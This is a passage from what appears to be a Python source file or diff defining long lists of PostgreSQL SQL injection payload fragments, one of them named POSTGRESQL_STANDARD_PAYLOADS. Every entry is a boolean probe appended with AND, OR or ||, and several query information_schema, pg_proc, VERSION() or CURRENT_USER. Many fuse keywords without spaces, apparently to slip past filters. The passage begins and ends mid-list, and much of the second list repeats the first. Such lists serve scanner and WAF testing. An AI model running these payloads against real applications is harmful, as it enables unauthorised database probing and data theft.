'AND LENGTH(CURRENT_DATE)NOT BETWEENLENGTH(-1)', "OR CASE WHEN CHAR_LENGTH('abc')ILIKE(SELECT COUNT(*) FROM information_schema.tables) THEN 1 ELSE 0 END", '|| CURRENT_DATE IS NOT NULL', '|| SQRT(4) IS NOT NULL', "OR 'admin' IS NOT NULL", '|| CAST(LOG(100) AS TEXT)<=CAST(NOW() AS TEXT)', 'OR LENGTH(ABS(-100))<>LENGTH(999)', 'AND (PG_BACKEND_PID()~~*(SELECT COUNT(*)))', 'AND CASE WHEN ROUND(2.5)!~~*MIN(1) THEN 1 ELSE 0 END', 'AND (3&1) IS NOT NULL', 'AND CAST(ARRAY_LENGTH(ARRAY[1,2,3],1) AS TEXT)ILIKECAST(STATEMENT_TIMESTAMP() AS TEXT)', 'AND ARRAY_APPEND(ARRAY[1,2],3)::TEXTIS NOT2', 'AND COUNT(1) IN (SELECT 1 UNION SELECT 2)', 'OR (EXTRACT(HOUR FROM NOW())LIKESQRT(4))', "AND QUOTE_LITERAL('test') IN (SELECT 1 UNION SELECT 2)", "AND (MD5('postgres')LIKE1::VARCHAR)", 'OR CHR(97)::INTEGER!~~*JSON_EXTRACT(\'{"a":1}\',\'$.a\')', "|| DATE_TRUNC('year',NOW())::TEXTINTO_DATE('2021-01-01','YYYY-MM-DD')::TEXT", '|| 1::VARCHAR<>CEIL(3.1)', "AND LENGTH(REPLACE('test','t','T'))BETWEENLENGTH(LENGTH('test'))", 'AND NOW()!~~*FLOOR(3.1)', 'AND LOG(10) IS NOT NULL', 'AND ROUND(3.14159,2) IN (SELECT 1 UNION SELECT 2)', "AND CAST(INITCAP('world') AS TEXT)<=CAST(SUBSTR('abcdef',1,1) AS TEXT)", "AND (INET_SERVER_PORT()INLENGTH('test'))", 'AND SUM(2)LIKECURRENT_SCHEMA()', "AND CASE WHEN MD5('postgres')!~~COUNT(1) THEN 1 ELSE 0 END", 'OR LENGTH(JSONB_EACH(\'{"a":1}\'))BETWEENLENGTH(CHR(66))', 'AND LOG(10) IN (SELECT 1 UNION SELECT 2)', 'OR (5&3) IN (SELECT 1 UNION SELECT 2)', 'OR (~1)NOT LIKELOG(100)', "OR CAST('1' AS INTEGER)::INTEGERLIKEOCTET_LENGTH('test')", 'AND CASE WHEN (SELECT COUNT(*) FROM pg_proc)LIKE(SELECT MAX(1)) THEN 1 ELSE 0 END', 'OR LOG(10) IN (SELECT 1 UNION SELECT 2)', "AND CONCAT('test','123')::NUMERICNOT BETWEENQUOTE_LITERAL('a')", "|| (SELECT MAX(1))::TEXTNOT ILIKETRIM('  a  ')", 'AND false IS NOT NULL', "AND CAST(REVERSE('abc') AS TEXT)!=CAST(ROUND(3.14159,2) AS TEXT)", 'AND CASE WHEN INET_SERVER_ADDR()INPG_TYPEOF(1) THEN 1 ELSE 0 END', "AND LENGTH(UPPER('a'))~~LENGTH(REPLACE('test','t','T'))", "AND (1|1)::TEXTBETWEENUPPER('a')::TEXT", '|| PG_TYPEOF(1) IS NOT NULL', 'OR CAST((SELECT COUNT(DISTINCT table_catalog) FROM information_schema.tables) AS TEXT)~~*CAST(ROUND(3.5) AS TEXT)', 'AND AVG(1)NOT ILIKEROUND(3.5)', "|| STRING_AGG('test',';') IN (SELECT 1 UNION SELECT 2)", 'AND (SELECT SUM(1))NOT LIKECOUNT(DISTINCT 1)', '|| CURRENT_SCHEMA() IN (SELECT 1 UNION SELECT 2)', '|| POWER(2,3)=SQRT(144)', "AND 'test'~~*SQRT(9)", 'AND CAST(CHR(66) AS TEXT)>CAST((SELECT MIN(1)) AS TEXT)', "|| CAST(CURRENT_DATE AS TEXT)ILIKECAST(MD5('test') AS TEXT)", "AND 'test' IN (SELECT 1 UNION SELECT 2)", 'AND SUM(1) IN (SELECT 1 UNION SELECT 2)', "AND TO_TIMESTAMP('2021-01-01','YYYY-MM-DD')::TEXT=TRUE::TEXT", "|| CASE WHEN INITCAP('hello')NOT LIKESQRT(16) THEN 1 ELSE 0 END", "|| SUBSTRING('abcdef' FROM 1 FOR 1)::TEXT!~~ABS(-1)", "AND LOWER('ADMIN')::TEXT~~*3.14159", "AND (EXTRACT(HOUR FROM NOW())>=CAST('1' AS INTEGER))", "|| MD5('test')::TEXT<=CAST(1 AS BIGINT)::TEXT", "AND CAST((7|4) AS TEXT)<>CAST(TYPEOF('test') AS TEXT)", 'AND CASE WHEN 1::TEXTNOT LIKEARRAY_APPEND(ARRAY[1,2],3) THEN 1 ELSE 0 END', "OR CONCAT('test','123')!~~*CURRENT_TIMESTAMP", '|| LENGTH(SUM(2))NOT LIKELENGTH(LN(2.718))', "|| LENGTH(STRING_AGG('a',','))>=LENGTH(VERSION())", 'AND TYPEOF(1) IN (SELECT 1 UNION SELECT 2)', 'OR CAST(JSON_VALID(\'{"a":1}\') AS TEXT)ILIKECAST(CURRENT_DATE AS TEXT)', 'OR (7|4)::NUMERICNOT ILIKEROUND(3.14159,2)', "AND CURRENT_TIMESTAMP()::TEXT<=TRIM('  a  ')", "OR COUNT(*)::INTEGERILIKEBIT_LENGTH('a')", "AND DATE_TRUNC('year',NOW()) IN (SELECT 1 UNION SELECT 2)", "AND (MD5('postgres')ISCEIL(3.1))", '|| LENGTH((SELECT MIN(1)))>LENGTH(COUNT(1))', "OR CASE WHEN QUOTE_LITERAL('a')!~~'a' THEN 1 ELSE 0 END", 'AND JSON_EXTRACT(\'{"a":1}\',\'$.a\') IS NOT NULL', 'OR CASE WHEN true>=CAST(1 AS NUMERIC) THEN 1 ELSE 0 END', 'AND 1 IN (SELECT 1 UNION SELECT 2)', '|| (FALSELIKEJSONB_KEYS(\'{"a":1,"b":2}\'))', "AND (1.5NOT INSUBSTRING('mysql' FROM 1))", "|| CASE WHEN LOWER('A')ILIKESUBSTRING('abcdef' FROM 1 FOR 1) THEN 1 ELSE 0 END", "OR LENGTH('a') IS NOT NULL", "AND CLOCK_TIMESTAMP()NOT ILIKE'postgres'", 'AND CAST(1 AS DECIMAL) IS NOT NULL', "OR CAST(RPAD('a',5,'0') AS TEXT)!~~CAST(ASCII('0') AS TEXT)", "|| MIN(1)::TEXT~~ASCII('A')::TEXT", "OR CAST(REPEAT('x',5) AS TEXT)~~*CAST(SQRT(4) AS TEXT)", "|| CAST(TO_DATE('2021-01-01','YYYY-MM-DD') AS TEXT)!~~CAST(3.14159 AS TEXT)", "OR LENGTH((8#3))~~LENGTH(LENGTH('test'))", "AND CONCAT('test','123')::TEXT~~LOG10(100)", "AND CASE WHEN TO_DATE('2021-01-01','YYYY-MM-DD')INEXTRACT(HOUR FROM NOW()) THEN 1 ELSE 0 END", '|| LENGTH((SELECT COUNT(DISTINCT table_catalog) FROM information_schema.tables))>=LENGTH(CEIL(3.9))', 'OR (8#3) IS NOT NULL', 'AND MIN(1)NOT LIKEJSON_VALID(\'{"a":1}\')', 'OR CAST(TYPEOF(1) AS TEXT)=CAST(3.14159 AS TEXT)', "AND (TO_DATE('2021-01-01','YYYY-MM-DD')NOT INLN(2.718))", '|| 1::VARCHAR::TEXT!~~FLOOR(100.1)::TEXT', '|| LOG10(100) IN (SELECT 1 UNION SELECT 2)', "|| LENGTH(true)!~~LENGTH(MD5('test'))", "AND SUBSTRING('abcdef' FROM 1 FOR 1)::TEXT!=LOWER('ADMIN')", "AND CAST(QUOTE_LITERAL('test') AS TEXT)IS NOTCAST(LOWER('ADMIN') AS TEXT)", 'OR CHR(97)+1!=1+1', "AND SHA1('test')!~~CAST(1 AS BIGINT)", "AND 'a'<>EXTRACT(DAY FROM NOW())", 'AND TYPEOF(1.5) IS NOT NULL', 'AND LENGTH((SELECT COUNT(*) FROM information_schema.tables))ISLENGTH(CHR(65))', "AND ASCII('A')<>'postgres'", '|| JSON_EXTRACT(\'{"a":1}\',\'$.a\') IS NOT NULL', 'AND ARRAY_LENGTH(ARRAY[1,2,3],1) IN (SELECT 1 UNION SELECT 2)', 'AND CAST((SELECT 1) AS TEXT)INCAST(1 AS TEXT)', 'AND CASE WHEN POWER(3,2)INLOG(10) THEN 1 ELSE 0 END', "OR LPAD('a',5,'0') IN (SELECT 1 UNION SELECT 2)", "AND STATEMENT_TIMESTAMP()>'postgres'", "|| (BIT_LENGTH('a')<CURRENT_DATABASE())", "OR 3.14159::TEXT!~~*RPAD('a',5,'0')::TEXT", 'AND CAST((1#1) AS TEXT)>CAST(CAST(1 AS CHAR) AS TEXT)', "OR 3.14159LIKE'a'", "AND REPEAT('a',3)::TEXT!=(SELECT COUNT(*) FROM pg_tables)", 'AND LENGTH(TYPEOF(1.5))ISLENGTH(CURRENT_SCHEMA())', 'AND ((SELECT COUNT(DISTINCT table_catalog) FROM information_schema.tables)!=SESSION_USER)', '|| false<>EXTRACT(MONTH FROM NOW())', "AND RPAD('a',5,'0')::TEXT>=CURRENT_TIME", "AND (CURRENT_USERISLPAD('a',5,'0'))", '|| NOW() IN (SELECT 1 UNION SELECT 2)', 'OR CURRENT_TIMESTAMP() IN (SELECT 1 UNION SELECT 2)', '|| COUNT(DISTINCT 1) IS NOT NULL', 'AND FALSE IS NOT NULL', 'OR ARRAY_AGG(1) IS NOT NULL', "OR CASE WHEN ASCII('0')!=CEIL(3.9) THEN 1 ELSE 0 END", "AND CAST('1' AS NUMERIC)::TEXT!~~ROUND(3.5)::TEXT", "AND SQRT(16)::INTEGER~~*'test'", "|| SQRT(9)NOT INMD5('postgres')", '|| LENGTH((SELECT COUNT(*) FROM information_schema.tables))NOT ILIKELENGTH((SELECT SUM(1)))', "|| TO_DATE('2021-01-01','YYYY-MM-DD')::INTEGER>=ARRAY_AGG(2)", "OR LENGTH('a')::TEXTBETWEENPG_TYPEOF(1)::TEXT", '|| (EXP(0)NOT INCURRENT_TIME)', "AND (SELECT COUNT(*) FROM pg_indexes)::NUMERICBETWEEN'1'::INTEGER", 'OR 0.1 IN (SELECT 1 UNION SELECT 2)', "AND CASE WHEN trueILIKELPAD('a',5,'0') THEN 1 ELSE 0 END", "AND CASE WHEN '1'::INTEGERILIKE(1&1) THEN 1 ELSE 0 END", "OR CAST(SHA256('test') AS TEXT)ISCAST(SIGN(-5) AS TEXT)", "|| EXTRACT(HOUR FROM NOW())ILIKELTRIM('  a')", 'OR CAST(1 AS VARCHAR) IN (SELECT 1 UNION SELECT 2)', 'OR CASE WHEN SUBSTRING(\'mysql\' FROM 1)>=JSON_EXTRACT(\'{"a":1}\',\'$.a\') THEN 1 ELSE 0 END', "OR CEIL(3.1)::NUMERIC<>CAST('1' AS NUMERIC)", "AND (COUNT(1)<>UPPER('a'))", 'OR LOG10(1000)NOT IN(SELECT COUNT(*) FROM information_schema.tables)', '|| CHR(97) IS NOT NULL', 'OR (LOG10(100)BETWEENAVG(1))', "OR OCTET_LENGTH('test')INTYPEOF(1)", "AND LENGTH(MAX(1))NOT BETWEENLENGTH(SUBSTRING('mysql' FROM 1))", "|| MD5('postgres')!~~-1", 'OR CLOCK_TIMESTAMP()>=-1', "|| LENGTH(SUM(2))>=LENGTH(LPAD('a',5,'0'))", 'AND LENGTH(MOD(5,2))IS NOTLENGTH(FLOOR(100.1))', "OR CAST(MD5('test') AS TEXT)LIKECAST(MIN(1) AS TEXT)", 'AND (ARRAY_LOWER(ARRAY[1,2,3],1)=COUNT(1))', "AND CASE WHEN MD5('postgres')>=CAST(1 AS DECIMAL) THEN 1 ELSE 0 END", 'OR EXTRACT(MONTH FROM NOW())!~~MAX(1)', 'AND ((~1)<>0)', 'AND COUNT(1)::INTEGERNOT LIKECURRENT_USER', '|| POWER(2,3)::INTEGERNOT LIKECAST(1 AS BIGINT)', 'AND LENGTH(current_database()) IS NOT NULL', '|| COUNT(DISTINCT 1)::TEXTINCURRENT_DATABASE()::TEXT', '|| COUNT(1)::INTEGER!=ARRAY_AGG(1)', "OR CASE WHEN REPLACE('test','t','T')BETWEEN(SELECT COUNT(*) FROM information_schema.columns) THEN 1 ELSE 0 END", "AND 'admin' IN (SELECT 1 UNION SELECT 2)", 'AND (SELECT COUNT(*) FROM pg_proc) IN (SELECT 1 UNION SELECT 2)', '|| 2INCURRENT_TIMESTAMP()', "AND FLOOR(3.9)NOT INREPLACE('test','t','T')", 'AND CURRENT_TIMESTAMP()NOT INCURRENT_TIME', '|| NOW()::TEXT!=false', 'AND INET_SERVER_PORT() IN (SELECT 1 UNION SELECT 2)', 'AND CEIL(0.1)!=ARRAY_AGG(2)', "AND SUBSTR('abcdef',1,1) IS NOT NULL", "OR LENGTH(TYPEOF(1.5))LIKELENGTH(SHA256('test'))", 'AND 1::VARCHARILIKETYPEOF(1)', "AND CAST(CHAR_LENGTH('abc') AS TEXT)!=CAST(ARRAY_AGG(2) AS TEXT)", 'OR (1#1)::INTEGERIS NOTSUM(1)', 'AND LENGTH((SELECT 1))INLENGTH((2>>1))', 'OR LN(2.718)BETWEENNULL', "OR CLOCK_TIMESTAMP()::TEXT<=LOWER('A')::TEXT", 'AND VERSION()INCEIL(0.1)', "AND SQRT(144)::TEXT>=CHAR_LENGTH('abc')::TEXT", "|| CAST(REVERSE('abc') AS TEXT)LIKECAST((1|1) AS TEXT)", 'AND (SELECT MIN(1))::TEXTNOT BETWEENCURRENT_TIMESTAMP::TEXT', "OR (3&1)::NUMERICNOT ILIKETO_DATE('2021-01-01','YYYY-MM-DD')", 'AND 1 IS NOT NULL', 'AND (SELECT SUM(1))::NUMERICNOT INFALSE', 'AND CURRENT_TIMESTAMP~~(2>>1)', 'OR ROUND(3.5) IS NOT NULL', "OR LENGTH(LOWER('ADMIN'))NOT BETWEENLENGTH(PG_BACKEND_PID())", 'AND CASE WHEN JSONB_KEYS(\'{"a":1,"b":2}\')NOT ININITCAP(\'hello\') THEN 1 ELSE 0 END', 'AND (1#1)::TEXT=PG_TYPEOF(1)::TEXT', 'OR LENGTH(EXTRACT(DAY FROM NOW()))NOT BETWEENLENGTH(COUNT(*))', 'OR CAST(POWER(2,3) AS TEXT)<CAST(ARRAY_LENGTH(ARRAY[1,2,3],1) AS TEXT)', "AND STRING_AGG('test',';') IN (SELECT 1 UNION SELECT 2)", "OR (RPAD('a',5,'0')!=(SELECT COUNT(*) FROM information_schema.tables))"]
+POSTGRESQL_STANDARD_PAYLOADS = ['|| CASE WHEN ARRAY_LOWER(ARRAY[1,2,3],1)>(0e0) THEN 1 ELSE 0 END', '|| (SELECT COUNT(*)) IS NOT NULL', "|| TO_TIMESTAMP('2021-01-01','YYYY-MM-DD')::TEXT!~~SUBSTRING('abcdef' FROM 1 FOR 1)::TEXT", "AND CHR(97)::INTEGERNOT ILIKETRIM('  a  ')", '|| LENGTH(POWER(3,2))<=LENGTH((SELECT COUNT(DISTINCT 1)))', "OR CAST(LENGTH('a') AS TEXT)NOT ILIKECAST(TRIM('  a  ') AS TEXT)", '|| (SIGN(-5)NOT BETWEENFALSE)', 'OR INET_SERVER_PORT() IN (SELECT 1 UNION SELECT 2)', '|| CASE WHEN (SELECT COUNT(*) FROM pg_tables)<(SELECT COUNT(*) FROM pg_views) THEN 1 ELSE 0 END', "OR (SELECT COUNT(*) FROM information_schema.columns)::INTEGERNOT BETWEENSHA1('test')", 'AND CAST(COUNT(1) AS TEXT)NOT LIKECAST(CEIL(3.1) AS TEXT)', "OR MD5('test') IN (SELECT 1 UNION SELECT 2)", "AND -1NOT INBIT_LENGTH('a')", 'AND MOD(10,3)::TEXTNOT BETWEENTRUE::TEXT', "OR RPAD('a',5,'0')::TEXT>=SHA1('test')::TEXT", 'AND (CAST(1 AS VARCHAR)<=ARRAY_UPPER(ARRAY[1,2,3],1))', "|| MD5('a')INARRAY_AGG(2)", 'AND (SELECT 1) IS NOT NULL', '|| CAST((~1) AS TEXT)!~~*CAST(12345 AS TEXT)', 'AND CASE WHEN ROUND(2.5)~~*EXTRACT(EPOCH FROM NOW()) THEN 1 ELSE 0 END', '|| MAX(1) IS NOT NULL', "AND CASE WHEN CHR(97)!=LTRIM('  a') THEN 1 ELSE 0 END", 'OR CURRENT_TIMESTAMP() IS NOT NULL', 'OR (SELECT COUNT(*) FROM information_schema.columns) IN (SELECT 1 UNION SELECT 2)', 'AND ROUND(2.5)::TEXT~~JSON_VALID(\'{"a":1}\')', 'AND CAST(1 AS NUMERIC)=CURRENT_TIME', '|| CAST(COUNT(DISTINCT 1) AS TEXT)>=CAST(ABS(-1) AS TEXT)', "OR LOWER('ADMIN')NOT LIKE'a'", 'AND LENGTH(\'test\')::INTEGERISJSONB_EACH(\'{"a":1}\')', '|| CURRENT_TIME IN (SELECT 1 UNION SELECT 2)', "AND (ENCODE(DIGEST('test','sha256'),'hex')LIKE(7|4))", 'AND -1 IN (SELECT 1 UNION SELECT 2)', "AND STRING_AGG('a',',')INVERSION()", "|| CAST((2>>1) AS TEXT)NOT BETWEENCAST(CONCAT('test','123') AS TEXT)", "AND CAST((1<<1) AS TEXT)!~~CAST(SPLIT_PART('a,b,c',',',1) AS TEXT)", "AND 'z'!~~(SELECT AVG(1))", '|| CAST(CURRENT_DATE AS TEXT)!~~CAST((8#3) AS TEXT)', "AND CAST((~1) AS TEXT)NOT BETWEENCAST(STRING_AGG('test',';') AS TEXT)", "AND CAST(CAST(1 AS CHAR) AS TEXT)=CAST(MD5('a') AS TEXT)", 'AND CASE WHEN CLOCK_TIMESTAMP()NOT ILIKETRUE THEN 1 ELSE 0 END', 'OR JSON_VALID(\'{"a":1}\') IN (SELECT 1 UNION SELECT 2)', 'AND JSON_EXTRACT(\'{"a":1}\',\'$.a\') IS NOT NULL', '|| LENGTH(NULL)BETWEENLENGTH(USER)', "AND CASE WHEN SUM(1)INCONCAT('a','b') THEN 1 ELSE 0 END", 'AND (CURRENT_DATE~~*FLOOR(100.1))', '|| FALSE::TEXTBETWEENCURRENT_DATE', '|| (1&1)IS0.1', '|| LN(2.718) IS NOT NULL', "AND SESSION_USER>=SUBSTR('abcdef',1,1)", 'OR 1::VARCHAR::INTEGERNOT BETWEEN(SELECT MAX(1))', "OR LTRIM('  a') IS NOT NULL", "|| STRING_AGG('a',',')::NUMERIC!~~(SELECT COUNT(DISTINCT 1))", "AND CAST(CONCAT('test','123') AS TEXT)>CAST(SIGN(0) AS TEXT)", 'AND (1&1)::NUMERIC~~STATEMENT_TIMESTAMP()', "|| ASCII('a')::TEXT<=(1|1)::TEXT", "|| INET_SERVER_PORT()::NUMERICINREPEAT('a',3)", "|| CAST((SELECT COUNT(*) FROM pg_views) AS TEXT)ILIKECAST(REPLACE('test','t','T') AS TEXT)", "AND CAST(CAST('1' AS NUMERIC) AS TEXT)NOT BETWEENCAST(CEIL(3.1) AS TEXT)", '|| SIGN(-5) IN (SELECT 1 UNION SELECT 2)', 'AND false::TEXTNOT ILIKECLOCK_TIMESTAMP()::TEXT', 'OR (EXP(1)<=PG_BACKEND_PID())', "OR CAST('1' AS INTEGER) IS NOT NULL", "AND CAST(CAST('1' AS INTEGER) AS TEXT)>CAST(1::NUMERIC AS TEXT)", 'AND (8#3) IS NOT NULL', "AND LOWER('ADMIN')=CAST(1 AS NUMERIC)", 'AND MOD(10,3)!=LN(2.718)', 'AND CAST(JSON_EXTRACT_PATH(\'{"a":1}\',\'a\') AS TEXT)IS NOTCAST(MIN(1) AS TEXT)', 'AND (SELECT COUNT(DISTINCT 1)) IN (SELECT 1 UNION SELECT 2)', 'OR CAST(1 AS VARCHAR)::TEXT!~~*CURRENT_TIME::TEXT', 'AND MOD(5,2)::TEXT<>(SELECT COUNT(*))::TEXT', '|| VERSION()::TEXT!=FLOOR(3.9)::TEXT', 'AND COUNT(*)+1NOT BETWEEN1+1', '|| LENGTH(CAST(1 AS TEXT))NOT LIKELENGTH(ARRAY_AGG(1))', "|| CEIL(3.9)INLPAD('a',5,'0')", 'AND CURRENT_SCHEMA() IS NOT NULL', "AND SHA256('test')~~DATE_TRUNC('month',NOW())", "AND (UPPER('a')ILIKEARRAY_LENGTH(ARRAY[1,2,3],1))", "|| MD5('postgres')<(1#1)", 'AND LN(2.718)::NUMERICINCURRENT_DATE', 'AND SQRT(144) IS NOT NULL', 'OR JSON_EXTRACT_PATH(\'{"a":1}\',\'a\')::TEXTILIKERTRIM(\'a  \')::TEXT', "AND LENGTH(INET_SERVER_PORT())~~LENGTH(SHA256('test'))", 'OR INET_SERVER_ADDR()=false', "OR (1#1)::TEXTINREPLACE('test','t','T')", 'AND CASE WHEN CURRENT_TIMEISCAST(1 AS DECIMAL) THEN 1 ELSE 0 END', 'AND MIN(1) IN (SELECT 1 UNION SELECT 2)', "AND (SELECT COUNT(*) FROM information_schema.columns)::TEXTLIKELPAD('a',5,'0')::TEXT", 'OR LENGTH((SELECT COUNT(*) FROM information_schema.tables))NOT LIKELENGTH((SELECT COUNT(DISTINCT table_catalog) FROM information_schema.tables))', "AND CAST(SQRT(9) AS TEXT)!=CAST(TRIM('  a  ') AS TEXT)", "|| (LOWER('ADMIN')=1.5)", 'OR ROUND(2.5) IS NOT NULL', '|| CASE WHEN CURRENT_TIMENOT ILIKEPG_POSTMASTER_START_TIME() THEN 1 ELSE 0 END', 'AND CASE WHEN 1<>EXP(1) THEN 1 ELSE 0 END', 'AND CAST(1 AS DECIMAL)::TEXT~~*(SELECT SUM(1))::TEXT', "OR ASCII('a')::TEXTNOT LIKENOW()", 'AND MOD(5,2)::INTEGER=SQRT(144)', 'OR (SELECT 1)::INTEGER<AVG(1)', "OR CAST(ABS(-1) AS TEXT)BETWEENCAST(REPLACE('test','t','T') AS TEXT)", "AND LENGTH(POWER(2,2))<LENGTH(MD5('a'))", "AND SUBSTR('test',1,1) IS NOT NULL", "AND CAST(SIGN(-5) AS TEXT)!=CAST(STRING_AGG('a',',') AS TEXT)", '|| ARRAY_LENGTH(ARRAY[1,2,3],1) IS NOT NULL', "AND MD5('test') IS NOT NULL", 'AND CAST(false AS TEXT)!~~*CAST(SUM(2) AS TEXT)', 'AND LENGTH(CURRENT_DATE)NOT BETWEENLENGTH(-1)', "OR CASE WHEN CHAR_LENGTH('abc')ILIKE(SELECT COUNT(*) FROM information_schema.tables) THEN 1 ELSE 0 END", '|| CURRENT_DATE IS NOT NULL', '|| SQRT(4) IS NOT NULL', "OR 'admin' IS NOT NULL", '|| CAST(LOG(100) AS TEXT)<=CAST(NOW() AS TEXT)', 'OR LENGTH(ABS(-100))<>LENGTH(999)', 'AND (PG_BACKEND_PID()~~*(SELECT COUNT(*)))', 'AND CASE WHEN ROUND(2.5)!~~*MIN(1) THEN 1 ELSE 0 END', 'AND (3&1) IS NOT NULL', 'AND CAST(ARRAY_LENGTH(ARRAY[1,2,3],1) AS TEXT)ILIKECAST(STATEMENT_TIMESTAMP() AS TEXT)', 'AND ARRAY_APPEND(ARRAY[1,2],3)::TEXTIS NOT2', 'AND COUNT(1) IN (SELECT 1 UNION SELECT 2)', 'OR (EXTRACT(HOUR FROM NOW())LIKESQRT(4))', "AND QUOTE_LITERAL('test') IN (SELECT 1 UNION SELECT 2)", "AND (MD5('postgres')LIKE1::VARCHAR)", 'OR CHR(97)::INTEGER!~~*JSON_EXTRACT(\'{"a":1}\',\'$.a\')', "|| DATE_TRUNC('year',NOW())::TEXTINTO_DATE('2021-01-01','YYYY-MM-DD')::TEXT", '|| 1::VARCHAR<>CEIL(3.1)', "AND LENGTH(REPLACE('test','t','T'))BETWEENLENGTH(LENGTH('test'))", 'AND NOW()!~~*FLOOR(3.1)', 'AND LOG(10) IS NOT NULL', 'AND ROUND(3.14159,2) IN (SELECT 1 UNION SELECT 2)', "AND CAST(INITCAP('world') AS TEXT)<=CAST(SUBSTR('abcdef',1,1) AS TEXT)", "AND (INET_SERVER_PORT()INLENGTH('test'))", 'AND SUM(2)LIKECURRENT_SCHEMA()', "AND CASE WHEN MD5('postgres')!~~COUNT(1) THEN 1 ELSE 0 END", 'OR LENGTH(JSONB_EACH(\'{"a":1}\'))BETWEENLENGTH(CHR(66))', 'AND LOG(10) IN (SELECT 1 UNION SELECT 2)', 'OR (5&3) IN (SELECT 1 UNION SELECT 2)', 'OR (~1)NOT LIKELOG(100)', "OR CAST('1' AS INTEGER)::INTEGERLIKEOCTET_LENGTH('test')", 'AND CASE WHEN (SELECT COUNT(*) FROM pg_proc)LIKE(SELECT MAX(1)) THEN 1 ELSE 0 END', 'OR LOG(10) IN (SELECT 1 UNION SELECT 2)', "AND CONCAT('test','123')::NUMERICNOT BETWEENQUOTE_LITERAL('a')", "|| (SELECT MAX(1))::TEXTNOT ILIKETRIM('  a  ')", 'AND false IS NOT NULL', "AND CAST(REVERSE('abc') AS TEXT)!=CAST(ROUND(3.14159,2) AS TEXT)", 'AND CASE WHEN INET_SERVER_ADDR()INPG_TYPEOF(1) THEN 1 ELSE 0 END', "AND LENGTH(UPPER('a'))~~LENGTH(REPLACE('test','t','T'))", "AND (1|1)::TEXTBETWEENUPPER('a')::TEXT", '|| PG_TYPEOF(1) IS NOT NULL', 'OR CAST((SELECT COUNT(DISTINCT table_catalog) FROM information_schema.tables) AS TEXT)~~*CAST(ROUND(3.5) AS TEXT)', 'AND AVG(1)NOT ILIKEROUND(3.5)', "|| STRING_AGG('test',';') IN (SELECT 1 UNION SELECT 2)", 'AND (SELECT SUM(1))NOT LIKECOUNT(DISTINCT 1)', '|| CURRENT_SCHEMA() IN (SELECT 1 UNION SELECT 2)', '|| POWER(2,3)=SQRT(144)', "AND 'test'~~*SQRT(9)", 'AND CAST(CHR(66) AS TEXT)>CAST((SELECT MIN(1)) AS TEXT)', "|| CAST(CURRENT_DATE AS TEXT)ILIKECAST(MD5('test') AS TEXT)", "AND 'test' IN (SELECT 1 UNION SELECT 2)", 'AND SUM(1) IN (SELECT 1 UNION SELECT 2)', "AND TO_TIMESTAMP('2021-01-01','YYYY-MM-DD')::TEXT=TRUE::TEXT", "|| CASE WHEN INITCAP('hello')NOT LIKESQRT(16) THEN 1 ELSE 0 END", "|| SUBSTRING('abcdef' FROM 1 FOR 1)::TEXT!~~ABS(-1)", "AND LOWER('ADMIN')::TEXT~~*3.14159", "AND (EXTRACT(HOUR FROM NOW())>=CAST('1' AS INTEGER))", "|| MD5('test')::TEXT<=CAST(1 AS BIGINT)::TEXT", "AND CAST((7|4) AS TEXT)<>CAST(TYPEOF('test') AS TEXT)", 'AND CASE WHEN 1::TEXTNOT LIKEARRAY_APPEND(ARRAY[1,2],3) THEN 1 ELSE 0 END', "OR CONCAT('test','123')!~~*CURRENT_TIMESTAMP", '|| LENGTH(SUM(2))NOT LIKELENGTH(LN(2.718))', "|| LENGTH(STRING_AGG('a',','))>=LENGTH(VERSION())", 'AND TYPEOF(1) IN (SELECT 1 UNION SELECT 2)', 'OR CAST(JSON_VALID(\'{"a":1}\') AS TEXT)ILIKECAST(CURRENT_DATE AS TEXT)', 'OR (7|4)::NUMERICNOT ILIKEROUND(3.14159,2)', "AND CURRENT_TIMESTAMP()::TEXT<=TRIM('  a  ')", "OR COUNT(*)::INTEGERILIKEBIT_LENGTH('a')", "AND DATE_TRUNC('year',NOW()) IN (SELECT 1 UNION SELECT 2)", "AND (MD5('postgres')ISCEIL(3.1))", '|| LENGTH((SELECT MIN(1)))>LENGTH(COUNT(1))', "OR CASE WHEN QUOTE_LITERAL('a')!~~'a' THEN 1 ELSE 0 END", 'AND JSON_EXTRACT(\'{"a":1}\',\'$.a\') IS NOT NULL', 'OR CASE WHEN true>=CAST(1 AS NUMERIC) THEN 1 ELSE 0 END', 'AND 1 IN (SELECT 1 UNION SELECT 2)', '|| (FALSELIKEJSONB_KEYS(\'{"a":1,"b":2}\'))', "AND (1.5NOT INSUBSTRING('mysql' FROM 1))", "|| CASE WHEN LOWER('A')ILIKESUBSTRING('abcdef' FROM 1 FOR 1) THEN 1 ELSE 0 END", "OR LENGTH('a') IS NOT NULL", "AND CLOCK_TIMESTAMP()NOT ILIKE'postgres'", 'AND CAST(1 AS DECIMAL) IS NOT NULL', "OR CAST(RPAD('a',5,'0') AS TEXT)!~~CAST(ASCII('0') AS TEXT)", "|| MIN(1)::TEXT~~ASCII('A')::TEXT", "OR CAST(REPEAT('x',5) AS TEXT)~~*CAST(SQRT(4) AS TEXT)", "|| CAST(TO_DATE('2021-01-01','YYYY-MM-DD') AS TEXT)!~~CAST(3.14159 AS TEXT)", "OR LENGTH((8#3))~~LENGTH(LENGTH('test'))", "AND CONCAT('test','123')::TEXT~~LOG10(100)", "AND CASE WHEN TO_DATE('2021-01-01','YYYY-MM-DD')INEXTRACT(HOUR FROM NOW()) THEN 1 ELSE 0 END", '|| LENGTH((SELECT COUNT(DISTINCT table_catalog) FROM information_schema.tables))>=LENGTH(CEIL(3.9))', 'OR (8#3) IS NOT NULL', 'AND MIN(1)NOT LIKEJSON_VALID(\'{"a":1}\')', 'OR CAST(TYPEOF(1) AS TEXT)=CAST(3.14159 AS TEXT)', "AND (TO_DATE('2021-01-01','YYYY-MM-DD')NOT INLN(2.718))", '|| 1::VARCHAR::TEXT!~~FLOOR(100.1)::TEXT', '|| LOG10(100) IN (SELECT 1 UNION SELECT 2)', "|| LENGTH(true)!~~LENGTH(MD5('test'))", "AND SUBSTRING('abcdef' FROM 1 FOR 1)::TEXT!=LOWER('ADMIN')", "AND CAST(QUOTE_LITERAL('test') AS TEXT)IS NOTCAST(LOWER('ADMIN') AS TEXT)", 'OR CHR(97)+1!=1+1', "AND SHA1('test')!~~CAST(1 AS BIGINT)", "AND 'a'<>EXTRACT(DAY FROM NOW())", 'AND TYPEOF(1.5) IS NOT NULL', 'AND LENGTH((SELECT COUNT(*) FROM information_schema.tables))ISLENGTH(CHR(65))', "AND ASCII('A')<>'postgres'", '|| JSON_EXTRACT(\'{"a":1}\',\'$.a\') IS NOT NULL', 'AND ARRAY_LENGTH(ARRAY[1,2,3],1) IN (SELECT 1 UNION SELECT 2)', 'AND CAST((SELECT 